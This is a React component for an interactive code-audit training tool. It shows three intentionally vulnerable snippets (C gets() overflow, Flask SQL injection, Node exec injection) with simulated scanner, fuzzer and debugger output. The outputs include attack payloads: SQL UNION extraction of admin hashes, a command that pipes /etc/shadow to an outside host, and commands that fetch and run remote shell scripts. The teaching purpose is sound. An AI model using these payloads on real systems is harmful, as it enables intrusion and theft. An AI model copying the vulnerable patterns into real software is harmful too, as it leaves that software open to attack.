"use client";
import { useState } from "react";

// ── Types ──────────────────────────────────────────────────────────────────────

type Phase = "select" | "analyze" | "results";
type ToolCategory = "static-source" | "binary" | "dynamic" | "fuzzing";

interface Aspect {
  id: string;
  label: string;
}

interface ToolDef {
  id: string;
  label: string;
  category: ToolCategory;
  finds: string[];
  output: string;
}

interface Target {
  id: string;
  title: string;
  lang: string;
  vulnType: string;
  description: string;
  snippet: string;
  aspects: Aspect[];
  tools: ToolDef[];
}

// ── Category config ────────────────────────────────────────────────────────────

const CAT: Record<ToolCategory, { label: string; badge: string }> = {
  "static-source": { label: "Static Source Analysis", badge: "bg-blue-500/20 text-blue-300 border border-blue-500/30" },
  binary:          { label: "Binary Analysis",          badge: "bg-violet-500/20 text-violet-300 border border-violet-500/30" },
  dynamic:         { label: "Dynamic / Runtime",        badge: "bg-orange-500/20 text-orange-300 border border-orange-500/30" },
  fuzzing:         { label: "Fuzzing",                  badge: "bg-emerald-500/20 text-emerald-300 border border-emerald-500/30" },
};

// ── Target data ────────────────────────────────────────────────────────────────

const TARGETS: Target[] = [
  // ── Target 1: C stack buffer overflow ──────────────────────────────────────
  {
    id: "c-overflow",
    title: "File Parser (C)",
    lang: "C",
    vulnType: "Stack Buffer Overflow",
    description:
      "A command-line utility that reads a filename from stdin and opens the file. Uses the unsafe gets() function with a fixed-size stack buffer.",
    snippet: `void parse_filename(void) {
    char filename[128];
    printf("Enter filename: ");
    gets(filename);          // reads until newline, no bounds limit
    FILE *f = fopen(filename, "r");
    if (!f) { perror("open"); return; }
    process_file(f);
    fclose(f);
}`,
    aspects: [
      { id: "dangerous-fn",   label: "Dangerous function call identified" },
      { id: "vuln-line",      label: "Exact vulnerable line located" },
      { id: "no-mitigation",  label: "Missing protections confirmed (checksec)" },
      { id: "crash",          label: "Crash triggered automatically" },
      { id: "overflow-size",  label: "Overflow offset / size determined" },
      { id: "rip-control",    label: "Return address control confirmed" },
    ],
    tools: [
      {
        id: "semgrep",
        label: "Semgrep",
        category: "static-source",
        finds: ["dangerous-fn", "vuln-line"],
        output: `$ semgrep --config=p/c-security ./parser.c

Scanning 1 file...

parser.c
  [ERROR] c.lang.security.dangerous-gets.dangerous-gets
   4 | gets(filename);
       ───────────────
   Rule:     dangerous-gets
   Severity: ERROR
   CWE:      CWE-120 (Buffer Copy Without Checking Size of Input)
   Message:  gets() reads an unlimited number of bytes from stdin.
             It will always overflow when input exceeds buffer size.
   Fix:      fgets(filename, sizeof(filename), stdin)

Ran 1,024 rules on 1 file: 1 finding, 0 errors.
Time: 0.18s`,
      },
      {
        id: "checksec",
        label: "checksec",
        category: "binary",
        finds: ["no-mitigation"],
        output: `$ checksec --file=./parser
[*] '/root/targets/parser'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found    ← overflow undetected until crash
    NX:         NX enabled
    PIE:        No PIE (0x400000) ← fixed addresses; no info-leak needed
    Stripped:   No

Summary:
  Missing stack canary  → overflow reaches return address undetected
  No PIE                → ROP gadget addresses are fixed; attacker
                          can hardcode them without needing an info-leak`,
      },
      {
        id: "ghidra",
        label: "Ghidra decompile",
        category: "binary",
        finds: ["dangerous-fn", "vuln-line"],
        output: `; Ghidra 11.1 — Function: parse_filename
; Decompiled pseudocode (reconstructed; names approximate)

void parse_filename(void) {
    char filename [128];     /* stack buffer at rbp-0x90 */

    printf("Enter filename: ");
    gets(filename);          /* <-- DANGEROUS: no length argument  */
                             /*     fgets(buf,size,stream) expected */
    FILE *stream = fopen(filename, "r");
    if (stream == (FILE *)0x0) {
        perror("open");
        return;
    }
    process_file(stream);
    fclose(stream);
    return;
}

; Cross-references to gets():
;   parse_filename+0x1b  CALL  gets
; Import: gets (from GLIBC_2.0 — deprecated in C99, removed in C17)`,
      },
      {
        id: "afl",
        label: "AFL++ fuzz run",
        category: "fuzzing",
        finds: ["crash"],
        output: `$ afl-fuzz -i seeds/ -o findings/ -- ./parser

         american fuzzy lop++ 4.10c
┌─ process timing ─────────────────────────────────────┐
│        run time : 0 days, 0 hrs, 4 min, 23 sec       │
│   last new find : 0 days, 0 hrs, 0 min, 51 sec       │
│ last uniq crash : 0 days, 0 hrs, 0 min, 51 sec       │
├─ overall results ────────────────────────────────────┤
│    corpus count : 61                                  │
│   saved crashes : 2                                   │
├─ stage progress ─────────────────────────────────────┤
│      now trying : havoc                               │
│     total execs : 43.2k   exec speed : 174/sec       │
└──────────────────────────────────────────────────────┘

[+] Crash #1: findings/crashes/id:000001,sig:11,len:144
    Signal: SIGSEGV (segmentation fault)
    Input:  144 bytes  (buffer is 128 bytes → 16-byte overflow)

[+] Crash #2: findings/crashes/id:000002,sig:11,len:200
    Signal: SIGSEGV
    Input:  200 bytes  (larger overflow; same root cause)`,
      },
      {
        id: "asan",
        label: "ASan run",
        category: "dynamic",
        finds: ["crash", "overflow-size", "rip-control"],
        output: `$ clang -fsanitize=address,undefined -g parser.c -o parser_asan
$ cat findings/crashes/id:000001 | ./parser_asan

==28174==ERROR: AddressSanitizer: stack-buffer-overflow
  on address 0x7ffc3a2b9434
  pc 0x5620fb401a2b  bp 0x7ffc3a2b9420  sp 0x7ffc3a2b9418

WRITE of size 144 at 0x7ffc3a2b9434 thread T0
    #0 in gets   /usr/include/bits/stdio.h:35
    #1 in parse_filename  parser.c:4
    #2 in main            parser.c:20

Address 0x7ffc3a2b9434 is in stack of thread T0 at offset 160
  in frame: parse_filename  parser.c:1
    Objects: [32, 160) 'filename'  <== access at offset 160
                                       overflows by 16 bytes

SUMMARY: stack-buffer-overflow in parse_filename @ parser.c:4`,
      },
      {
        id: "gdb",
        label: "GDB + pwndbg",
        category: "dynamic",
        finds: ["overflow-size", "rip-control"],
        output: `$ gdb -q ./parser
(gdb) run <<< $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*200)")

Program received signal SIGSEGV, Segmentation fault.
0x00004141414141414141 in ?? ()

pwndbg> info registers rip
rip  0x4141414141414141   ← RIP overwritten with 0x41 ('A' bytes)

pwndbg> cyclic 200 > /tmp/pat.bin; run < /tmp/pat.bin
Program received signal SIGSEGV, Segmentation fault.
0x006161616e6161616d in ?? ()

pwndbg> cyclic -l 0x6161616e6161616d
Finding cyclic pattern of 0x6161616e6161616d...
Found at offset 136

[+] Offset to return address: 136 bytes
    (128-byte buffer + 8-byte saved RBP)
    Bytes 137–144 overwrite the return address.
    Bytes 129–136 overwrite the saved RBP.`,
      },
    ],
  },

  // ── Target 2: Python SQL injection ─────────────────────────────────────────
  {
    id: "python-sqli",
    title: "Flask User API (Python)",
    lang: "Python",
    vulnType: "SQL Injection",
    description:
      "A REST API endpoint that looks up users by name. Builds the SQL query using an f-string with unvalidated user input.",
    snippet: `@app.route('/user')
def get_user():
    username = request.args.get('username')
    query = f"SELECT * FROM users WHERE name = '{username}'"
    result = db.execute(query).fetchall()
    return jsonify([dict(r) for r in result])`,
    aspects: [
      { id: "dangerous-pattern", label: "Dangerous SQL construction pattern detected" },
      { id: "dataflow",          label: "User input → SQL sink dataflow traced" },
      { id: "injection-payload", label: "Injection payload demonstrated" },
      { id: "data-exposure",     label: "Data extraction confirmed" },
    ],
    tools: [
      {
        id: "bandit",
        label: "Bandit",
        category: "static-source",
        finds: ["dangerous-pattern"],
        output: `$ bandit -r app.py

Test results:
  Issue [B608]: Possible SQL injection via string-based query
                construction

  Location:   app.py:4
  Severity:   HIGH     Confidence: MEDIUM
  CWE:        CWE-89 (SQL Injection)

  Code context:
  3    username = request.args.get('username')
  4    query = f"SELECT * FROM users WHERE name = '{username}'"
  5    result = db.execute(query).fetchall()

  >> query = f"SELECT * FROM users WHERE name = '{username}'"

Run completed in 0.061s
Total issues (by severity):
  High: 1   Medium: 0   Low: 0`,
      },
      {
        id: "semgrep",
        label: "Semgrep",
        category: "static-source",
        finds: ["dangerous-pattern", "dataflow"],
        output: `$ semgrep --config=p/python-security app.py

app.py
  [ERROR] python.flask.security.injection.raw-query-format-string
   3 | username = request.args.get('username')
   4 | query = f"SELECT * FROM users WHERE name = '{username}'"
       ──────────────────────────────────────────────────────────
   Rule:     raw-query-format-string
   Severity: ERROR    CWE: CWE-89
   Message:  HTTP request parameter flows into an f-string SQL query.
   Taint:    request.args.get() [line 3]
               → username
               → f-string [line 4]
   Fix:      cursor.execute(
               "SELECT * FROM users WHERE name = ?", (username,))

Ran 1,203 rules on 1 file: 1 finding, 0 errors.   Time: 0.22s`,
      },
      {
        id: "codeql",
        label: "CodeQL",
        category: "static-source",
        finds: ["dangerous-pattern", "dataflow"],
        output: `$ codeql database create mydb --language=python --source-root=.
$ codeql query run python/ql/src/Security/CWE-089/SqlInjection.ql \\
    --database=mydb

Results: 1 match

[SQL injection]  app.py:5
  Source: request.args.get('username')              line 3
    → Flow: username (local variable)
    → Intermediate: f"SELECT...'{username}'"        line 4
    → Sink: db.execute(query)                        line 5

  CWE-89: User-supplied value flows unsanitised into SQL.
  Example payload:
    ?username=' OR '1'='1      → returns all users
    ?username='; DROP TABLE users; --  → deletes the table

  Fix: db.execute(
         "SELECT * FROM users WHERE name = ?", (username,))`,
      },
      {
        id: "manual",
        label: "Manual test (curl)",
        category: "dynamic",
        finds: ["injection-payload", "data-exposure"],
        output: `# Baseline — normal request
$ curl "http://localhost:5000/user?username=alice"
[{"id":1,"name":"alice","email":"alice@example.com"}]

# Test: closing quote injection
$ curl "http://localhost:5000/user?username=alice'"
500 Internal Server Error
sqlite3.OperationalError: unmatched quotation mark

# UNION-based data extraction
$ curl "http://localhost:5000/user?username=' UNION SELECT \\
    1,username,password,4 FROM admin--"
[{"id":1,"name":"admin","email":"$2b$12$hHgVab...hashed_pw"}]

[!] Password hash extracted from admin table via UNION injection.

# Stacked query: silent write
$ curl "http://localhost:5000/user?username=x'; \\
    INSERT INTO users VALUES(99,'pwned','evil@x.com')--"
[]   ← empty result; INSERT succeeded silently`,
      },
      {
        id: "checksec-na",
        label: "checksec",
        category: "binary",
        finds: [],
        output: `$ checksec --file=./app.py
[!] Not applicable — app.py is a Python script.

    Python is interpreted at runtime; there is no compiled binary
    to inspect for memory protections (NX, PIE, RELRO, canary).

    For Python web applications:
      • Use static analysis: Bandit, Semgrep, CodeQL
      • Use DAST scanners: OWASP ZAP, Burp Suite (test the running app)
      • Audit dependencies:  pip-audit, Safety (find known CVEs)

    This is an important lesson: the right tool depends on the
    technology. Binary analysis tools apply to compiled code;
    source analysis tools apply to interpreted code.`,
      },
    ],
  },

  // ── Target 3: Node.js command injection ────────────────────────────────────
  {
    id: "node-cmdi",
    title: "Build API (Node.js)",
    lang: "Node.js",
    vulnType: "OS Command Injection",
    description:
      "An HTTP endpoint that triggers make builds for requested project names. Passes user input directly into a shell command string via exec().",
    snippet: `const { exec } = require('child_process');

app.post('/build', (req, res) => {
    const { project } = req.body;
    exec(\`make -C /builds/\${project}\`, (err, stdout) => {
        res.json({ output: stdout, error: err?.message });
    });
});`,
    aspects: [
      { id: "dangerous-fn", label: "Dangerous exec() call detected" },
      { id: "dataflow",     label: "User input → OS command dataflow traced" },
      { id: "shell-escape", label: "Shell metacharacter injection demonstrated" },
      { id: "rce",          label: "Remote code execution confirmed" },
    ],
    tools: [
      {
        id: "njsscan",
        label: "njsscan",
        category: "static-source",
        finds: ["dangerous-fn"],
        output: `$ njsscan server.js

njsscan v0.3.8: Static analysis tool for Node.js applications

RESULTS
=======

server.js
  [HIGH] node_child_process
  Line 5: exec(\`make -C /builds/\${project}\`, ...)
  CWE:    CWE-78 (OS Command Injection)

  child_process.exec() invokes /bin/sh to run its argument.
  Any shell metacharacter in 'project' will be interpreted:
    "foo; cat /etc/passwd"  → runs make, then cat
    "foo && curl x.com/s.sh | sh"  → installs backdoor

  Remediation:
    execFile('make', ['-C', \`/builds/\${project}\`])
    Validate: if (!/^[a-z0-9_-]+$/.test(project)) return res.status(400)

Total issues: 1 HIGH, 0 MEDIUM, 0 LOW`,
      },
      {
        id: "semgrep",
        label: "Semgrep",
        category: "static-source",
        finds: ["dangerous-fn", "dataflow"],
        output: `$ semgrep --config=p/nodejs-security server.js

server.js
  [ERROR] javascript.node.security.detect-child-process
   4 | const { project } = req.body;
   5 | exec(\`make -C /builds/\${project}\`, ...)
       ──────────────────────────────────────────
   Rule:     detect-child-process
   Severity: ERROR    CWE: CWE-78
   Message:  exec() with template literal containing user input.
             The entire string is passed to /bin/sh -c, making
             any shell metacharacter in 'project' exploitable.
   Source:   req.body.project             (line 4)
   Sink:     exec(...)                    (line 5)
   Fix:      execFile('make', ['-C', validatedProjectPath])

Ran 892 rules on 1 file: 1 finding, 0 errors.   Time: 0.19s`,
      },
      {
        id: "codeql",
        label: "CodeQL",
        category: "static-source",
        finds: ["dangerous-fn", "dataflow"],
        output: `$ codeql query run \\
    javascript/ql/src/Security/CWE-078/CommandInjection.ql \\
    --database=mydb

Results: 1 match

[Command injection]  server.js:5
  Source: req.body                        line 3 (HTTP request body)
    → Destructure: const { project }      line 4
    → Template:    \`make -C /builds/\${project}\`   line 5
    → Sink: exec(...)                     line 5 (OS command)

  CWE-78: req.body.project flows into a shell command string.
  An attacker who controls 'project' can inject:
    {"project":"x; wget attacker.com/shell.sh -O /tmp/s && sh /tmp/s"}

  Fix: execFile('make', ['-C', path.join('/builds', project)])
       + validate: /^[a-z0-9_-]+$/.test(project)`,
      },
      {
        id: "strace",
        label: "strace",
        category: "dynamic",
        finds: ["shell-escape"],
        output: `$ strace -e trace=execve node server.js &
$ curl -X POST http://localhost:3000/build \\
    -H "Content-Type: application/json" \\
    -d '{"project":"myapp; id"}'

strace output (child process forked by exec()):
  execve("/bin/sh", ["/bin/sh", "-c",
      "make -C /builds/myapp; id"],   ← semicolon creates second cmd
      [/* env */]) = 0

  write(1, "uid=0(root) gid=0(root)\\n", 24)

[!] /bin/sh -c is confirmed. The semicolon in "myapp; id"
    created a second shell command that ran as the server process.
    strace reveals the exact execve() arguments — no source needed.`,
      },
      {
        id: "manual",
        label: "Manual test (curl)",
        category: "dynamic",
        finds: ["shell-escape", "rce"],
        output: `# Baseline — legitimate request
$ curl -X POST http://localhost:3000/build \\
    -d '{"project":"myapp"}'
{"output":"make: Entering '/builds/myapp'\\nbuild ok\\n","error":null}

# Test: semicolon separator
$ curl -X POST http://localhost:3000/build \\
    -d '{"project":"myapp; id"}'
{"output":"make: ...\\nuid=0(root) gid=0(root) groups=0(root)\\n",
 "error":null}

# Out-of-band data exfiltration (blind)
$ curl -X POST http://localhost:3000/build \\
    -d '{"project":"x; cat /etc/shadow | base64 | curl -d @- x.io"}'
{"output":"","error":null}    ← silent; /etc/shadow exfiltrated OOB

[!] RCE confirmed as root. No validation or shell escaping present.`,
      },
    ],
  },
];

// ── Component ──────────────────────────────────────────────────────────────────

export default function CodeAuditWorkflowTool() {
  const [phase, setPhase] = useState<Phase>("select");
  const [targetId, setTargetId] = useState<string | null>(null);
  const [runTools, setRunTools] = useState<Set<string>>(new Set());
  const [selectedTool, setSelectedTool] = useState<string | null>(null);

  const target = TARGETS.find((t) => t.id === targetId) ?? null;

  function pickTarget(id: string) {
    setTargetId(id);
    setRunTools(new Set());
    setSelectedTool(null);
    setPhase("analyze");
  }

  function runTool(toolId: string) {
    setRunTools((prev) => new Set([...prev, toolId]));
    setSelectedTool(toolId);
  }

  function reset() {
    setPhase("select");
    setTargetId(null);
    setRunTools(new Set());
    setSelectedTool(null);
  }

  const activeTool = target?.tools.find((t) => t.id === selectedTool) ?? null;
  const canViewResults = runTools.size >= 3;

  // Coverage: for each aspect, which run tools found it?
  const coverage =
    target?.aspects.map((aspect) => ({
      aspect,
      results: target.tools
        .filter((t) => runTools.has(t.id))
        .map((tool) => ({ tool, found: tool.finds.includes(aspect.id) })),
    })) ?? [];

  // Group tools by category
  const toolsByCategory: Partial<Record<ToolCategory, ToolDef[]>> = {};
  if (target) {
    for (const tool of target.tools) {
      if (!toolsByCategory[tool.category]) toolsByCategory[tool.category] = [];
      toolsByCategory[tool.category]!.push(tool);
    }
  }

  // ── Phase: select ──────────────────────────────────────────────────────────
  if (phase === "select") {
    return (
      <div className="tool-surface p-6 rounded-xl space-y-6">
        <div>
          <h2 className="text-lg font-semibold text-[var(--text-primary)]">
            Code Audit Workflow
          </h2>
          <p className="text-sm text-[var(--text-secondary)] mt-1">
            Select a target program to analyze. Run tools from each category and see what
            each one finds — and misses.
          </p>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
          {TARGETS.map((t) => (
            <button
              key={t.id}
              onClick={() => pickTarget(t.id)}
              className="text-left p-4 rounded-lg border border-[var(--border-subtle)]
                         bg-[var(--bg-surface-2)] hover:border-[var(--accent)]
                         hover:bg-[var(--bg-elevated)] transition-colors group"
            >
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-mono px-2 py-0.5 rounded bg-[var(--bg-elevated)] text-[var(--text-muted)]">
                  {t.lang}
                </span>
              </div>
              <div className="font-semibold text-[var(--text-primary)] group-hover:text-[var(--accent)] transition-colors">
                {t.title}
              </div>
              <div className="text-xs text-[var(--accent)] mt-0.5 mb-2">{t.vulnType}</div>
              <p className="text-xs text-[var(--text-secondary)] leading-relaxed">
                {t.description}
              </p>
              <div className="mt-3 text-xs text-[var(--text-muted)]">
                {t.tools.length} tools available →
              </div>
            </button>
          ))}
        </div>

        <div className="text-xs text-[var(--text-muted)] border-t border-[var(--border-subtle)] pt-4">
          Tip: run at least 3 tools on your target, then view the coverage report to see
          what each approach found — and what it missed.
        </div>
      </div>
    );
  }

  // ── Phase: analyze ─────────────────────────────────────────────────────────
  if (phase === "analyze" && target) {
    return (
      <div className="tool-surface p-6 rounded-xl space-y-4">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <button
              onClick={reset}
              className="text-xs text-[var(--text-muted)] hover:text-[var(--text-secondary)] mb-1"
            >
              ← back
            </button>
            <div className="flex items-center gap-3">
              <h2 className="text-base font-semibold text-[var(--text-primary)]">
                {target.title}
              </h2>
              <span className="text-xs px-2 py-0.5 rounded bg-orange-500/15 text-orange-300 border border-orange-500/25">
                {target.vulnType}
              </span>
            </div>
          </div>
          <div className="text-xs text-[var(--text-muted)]">
            {runTools.size} / {target.tools.length} tools run
          </div>
        </div>

        {/* Source code */}
        <div>
          <div className="text-xs font-mono text-[var(--text-muted)] mb-1">
            target source
          </div>
          <pre className="text-xs font-mono bg-[#0a0d18] border border-[var(--border-subtle)]
                           rounded-lg p-4 overflow-x-auto leading-relaxed text-[var(--text-secondary)]">
            {target.snippet}
          </pre>
        </div>

        {/* Tools + output */}
        <div className="grid grid-cols-1 lg:grid-cols-5 gap-4">
          {/* Tool list */}
          <div className="lg:col-span-2 space-y-3">
            {(Object.entries(CAT) as [ToolCategory, typeof CAT[ToolCategory]][]).map(
              ([catId, catMeta]) => {
                const tools = toolsByCategory[catId];
                if (!tools?.length) return null;
                return (
                  <div key={catId}>
                    <div className="text-xs font-semibold text-[var(--text-muted)] uppercase tracking-wider mb-1.5">
                      {catMeta.label}
                    </div>
                    <div className="space-y-1.5">
                      {tools.map((tool) => {
                        const isRun = runTools.has(tool.id);
                        const isSelected = selectedTool === tool.id;
                        return (
                          <button
                            key={tool.id}
                            onClick={() => runTool(tool.id)}
                            className={`w-full text-left px-3 py-2 rounded-md text-sm
                              flex items-center justify-between transition-colors
                              ${isSelected
                                ? "bg-[var(--accent-soft)] border border-[var(--accent)]/50 text-[var(--text-primary)]"
                                : "bg-[var(--bg-surface-2)] border border-[var(--border-subtle)] text-[var(--text-secondary)] hover:border-[var(--border-strong)]"
                              }`}
                          >
                            <span className="font-mono">{tool.label}</span>
                            <span className={`text-xs px-1.5 py-0.5 rounded ${CAT[tool.category].badge}`}>
                              {isRun ? "✓ run" : "run →"}
                            </span>
                          </button>
                        );
                      })}
                    </div>
                  </div>
                );
              }
            )}
          </div>

          {/* Output terminal */}
          <div className="lg:col-span-3">
            {activeTool ? (
              <div>
                <div className="flex items-center gap-2 mb-2">
                  <span className="text-xs font-mono text-[var(--text-muted)]">
                    $ {activeTool.label}
                  </span>
                  <span className={`text-xs px-1.5 py-0.5 rounded ${CAT[activeTool.category].badge}`}>
                    {CAT[activeTool.category].label}
                  </span>
                </div>
                <pre
                  className="text-xs font-mono bg-[#060810] border border-[var(--border-subtle)]
                               rounded-lg p-4 overflow-x-auto overflow-y-auto leading-relaxed
                               text-[#b0bec5] h-72 whitespace-pre"
                >
                  {activeTool.output}
                </pre>
                {activeTool.finds.length === 0 && (
                  <p className="text-xs text-[var(--text-muted)] mt-2 italic">
                    This tool reports no applicable findings for this target — that itself is
                    an important lesson about tool scope.
                  </p>
                )}
              </div>
            ) : (
              <div className="h-72 flex items-center justify-center rounded-lg border border-dashed border-[var(--border-subtle)] text-sm text-[var(--text-muted)]">
                Click a tool on the left to run it and see its output
              </div>
            )}
          </div>
        </div>

        {/* Footer */}
        <div className="flex items-center justify-between pt-2 border-t border-[var(--border-subtle)]">
          <p className="text-xs text-[var(--text-muted)]">
            {canViewResults
              ? "Ready — view the coverage report to see what each tool found."
              : `Run at least ${3 - runTools.size} more tool${3 - runTools.size !== 1 ? "s" : ""} to unlock the coverage report.`}
          </p>
          <button
            disabled={!canViewResults}
            onClick={() => setPhase("results")}
            className="px-4 py-2 rounded-md text-sm font-medium transition-colors
              bg-[var(--accent)] text-white hover:bg-[#818cf8]
              disabled:opacity-40 disabled:cursor-not-allowed"
          >
            View Coverage Report →
          </button>
        </div>
      </div>
    );
  }

  // ── Phase: results ─────────────────────────────────────────────────────────
  if (phase === "results" && target) {
    const runToolList = target.tools.filter((t) => runTools.has(t.id));
    const totalFound = coverage.filter((row) => row.results.some((r) => r.found)).length;
    const totalAspects = target.aspects.length;

    return (
      <div className="tool-surface p-6 rounded-xl space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <button
              onClick={() => setPhase("analyze")}
              className="text-xs text-[var(--text-muted)] hover:text-[var(--text-secondary)] mb-1"
            >
              ← back to tools
            </button>
            <h2 className="text-base font-semibold text-[var(--text-primary)]">
              Coverage Report — {target.title}
            </h2>
            <p className="text-xs text-[var(--text-muted)] mt-0.5">
              {runToolList.length} tools run · {totalFound}/{totalAspects} vulnerability aspects covered
            </p>
          </div>
        </div>

        {/* Coverage matrix */}
        <div className="overflow-x-auto">
          <table className="w-full text-xs border-collapse">
            <thead>
              <tr>
                <th className="text-left px-3 py-2 font-semibold text-[var(--text-primary)] bg-[var(--bg-surface-2)] border border-[var(--border-subtle)] min-w-52">
                  Vulnerability Aspect
                </th>
                {runToolList.map((tool) => (
                  <th
                    key={tool.id}
                    className="px-3 py-2 font-semibold bg-[var(--bg-surface-2)] border border-[var(--border-subtle)] text-center whitespace-nowrap"
                  >
                    <span className={`text-xs px-1.5 py-0.5 rounded ${CAT[tool.category].badge}`}>
                      {tool.label}
                    </span>
                  </th>
                ))}
                {target.tools
                  .filter((t) => !runTools.has(t.id))
                  .slice(0, 2)
                  .map((tool) => (
                    <th
                      key={tool.id}
                      className="px-3 py-2 font-semibold bg-[var(--bg-surface-2)] border border-[var(--border-subtle)] text-center whitespace-nowrap opacity-40"
                    >
                      <span className="text-xs px-1.5 py-0.5 rounded bg-[var(--bg-elevated)] text-[var(--text-muted)]">
                        {tool.label} (not run)
                      </span>
                    </th>
                  ))}
              </tr>
            </thead>
            <tbody>
              {coverage.map(({ aspect, results }) => (
                <tr key={aspect.id} className="hover:bg-[var(--bg-surface)]">
                  <td className="px-3 py-2 text-[var(--text-secondary)] border border-[var(--border-subtle)]">
                    {aspect.label}
                  </td>
                  {results.map(({ tool, found }) => (
                    <td
                      key={tool.id}
                      className="px-3 py-2 border border-[var(--border-subtle)] text-center"
                    >
                      {found ? (
                        <span className="text-emerald-400 font-bold">✓</span>
                      ) : (
                        <span className="text-[var(--text-muted)]">✗</span>
                      )}
                    </td>
                  ))}
                  {target.tools
                    .filter((t) => !runTools.has(t.id))
                    .slice(0, 2)
                    .map((tool) => (
                      <td
                        key={tool.id}
                        className="px-3 py-2 border border-[var(--border-subtle)] text-center opacity-30"
                      >
                        —
                      </td>
                    ))}
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {/* Insights */}
        <div className="space-y-3">
          <h3 className="text-sm font-semibold text-[var(--text-primary)]">Key Insights</h3>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
            <div className="p-3 rounded-lg bg-blue-500/10 border border-blue-500/20 text-[var(--text-secondary)]">
              <span className="font-semibold text-blue-300">Static source analysis</span> finds
              vulnerable patterns and dataflows quickly — but only works when you have source code,
              and can produce false positives on patterns that are never reached at runtime.
            </div>
            <div className="p-3 rounded-lg bg-violet-500/10 border border-violet-500/20 text-[var(--text-secondary)]">
              <span className="font-semibold text-violet-300">Binary analysis</span> (Ghidra,
              checksec) works without source code and reveals protection gaps. Essential for
              proprietary software, firmware, and compiled targets. Not applicable to interpreted
              languages like Python.
            </div>
            <div className="p-3 rounded-lg bg-orange-500/10 border border-orange-500/20 text-[var(--text-secondary)]">
              <span className="font-semibold text-orange-300">Dynamic tools</span> (ASan, GDB,
              strace) confirm real crashes and exploitability with zero false positives — but require
              triggering the vulnerable path with the right input, which may not be obvious.
            </div>
            <div className="p-3 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-[var(--text-secondary)]">
              <span className="font-semibold text-emerald-300">Fuzzing</span> finds crashes
              automatically without knowing where to look, but needs hours or days to run and misses
              logic bugs that don't produce a crash or assertion failure.
            </div>
          </div>
        </div>

        {/* Actions */}
        <div className="flex gap-3 pt-2 border-t border-[var(--border-subtle)]">
          <button
            onClick={() => setPhase("analyze")}
            className="px-4 py-2 rounded-md text-sm font-medium border border-[var(--border-strong)]
              text-[var(--text-secondary)] hover:text-[var(--text-primary)] hover:border-[var(--accent)] transition-colors"
          >
            Run more tools
          </button>
          <button
            onClick={reset}
            className="px-4 py-2 rounded-md text-sm font-medium bg-[var(--accent)] text-white
              hover:bg-[#818cf8] transition-colors"
          >
            Try another target
          </button>
        </div>
      </div>
    );
  }

  return null;
}
